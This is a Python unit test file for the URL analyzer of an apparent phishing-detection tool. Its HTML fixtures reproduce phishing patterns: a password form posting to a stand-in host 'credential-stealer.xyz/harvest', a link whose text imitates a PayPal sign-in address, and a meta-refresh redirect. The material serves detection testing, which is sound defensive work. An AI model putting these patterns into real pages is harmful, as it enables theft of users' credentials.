"""
Unit tests for URLAnalyzer in PhishGuard AI.
"""
from app.analyzers.url_analyzer import URLAnalyzer


def test_url_analyzer_detects_ip_and_shortener():
    text = """
    Check this link: http://bit.ly/secure-login
    And our direct IP server: http://192.0.2.1/auth?token=credential_verify
    """
    analyzer = URLAnalyzer()
    res = analyzer.analyze(text=text, html=None)

    assert res.total_count == 2
    domains = [f.domain for f in res.findings]
    assert "bit.ly" in domains
    assert "192.0.2.1" in domains

    bitly_finding = next(f for f in res.findings if f.domain == "bit.ly")
    assert bitly_finding.is_shortener is True

    ip_finding = next(f for f in res.findings if f.domain == "192.0.2.1")
    assert ip_finding.is_ip_based is True
    assert ip_finding.has_suspicious_params is True


def test_url_analyzer_html_extraction():
    html = """
    <html>
      <body>
        <a href="https://legitimate.org/index.html">Safe link</a>
        <img src="http://tracker-pixel.org/pixel.gif"/>
      </body>
    </html>
    """
    analyzer = URLAnalyzer()
    res = analyzer.analyze(text="", html=html)

    assert res.total_count == 2
    sources = [f.source_location for f in res.findings]
    assert "html_href" in sources
    assert "html_src" in sources


def test_url_analyzer_deceptive_anchor_and_form_action_and_meta_refresh():
    """
    Test enterprise detection of:
    1. Deceptive anchor text (displays trusted domain, directs to malicious domain).
    2. HTML form action (embedded credential harvesting form).
    3. HTML meta-refresh redirect.
    """
    html = """
    <html>
      <head>
        <meta http-equiv="refresh" content="5; url=https://sneaky-redirect.org/landing">
      </head>
      <body>
        <!-- Deceptive Anchor -->
        <p>Please update your account:
          <a href="https://evil-phish.com/verify">https://secure.paypal.com/signin</a>
        </p>

        <!-- Embedded Form Target -->
        <form action="https://credential-stealer.xyz/harvest" method="POST">
          <input type="password" name="pwd"/>
          <button type="submit">Submit</button>
        </form>
      </body>
    </html>
    """
    analyzer = URLAnalyzer()
    res = analyzer.analyze(text="", html=html)

    # 1. Check deceptive anchor
    deceptive_finding = next(
        (f for f in res.findings if f.domain == "evil-phish.com"),
        None,
    )
    assert deceptive_finding is not None
    assert deceptive_finding.is_deceptive_anchor is True
    assert deceptive_finding.anchor_text == "https://secure.paypal.com/signin"
    assert deceptive_finding.risk_level in ("high", "critical")
    assert any("deceptive" in reason.lower() for reason in deceptive_finding.detection_reasons)

    # 2. Check form action
    form_finding = next(
        (f for f in res.findings if f.domain == "credential-stealer.xyz"),
        None,
    )
    assert form_finding is not None
    assert form_finding.is_form_action is True
    assert form_finding.source_location == "html_form_action"
    assert form_finding.risk_level in ("high", "critical")
    assert any("form" in reason.lower() for reason in form_finding.detection_reasons)

    # 3. Check meta refresh
    meta_finding = next(
        (f for f in res.findings if f.domain == "sneaky-redirect.org"),
        None,
    )
    assert meta_finding is not None
    assert meta_finding.is_meta_refresh is True
    assert meta_finding.source_location == "html_meta_refresh"
    assert any("refresh" in reason.lower() for reason in meta_finding.detection_reasons)

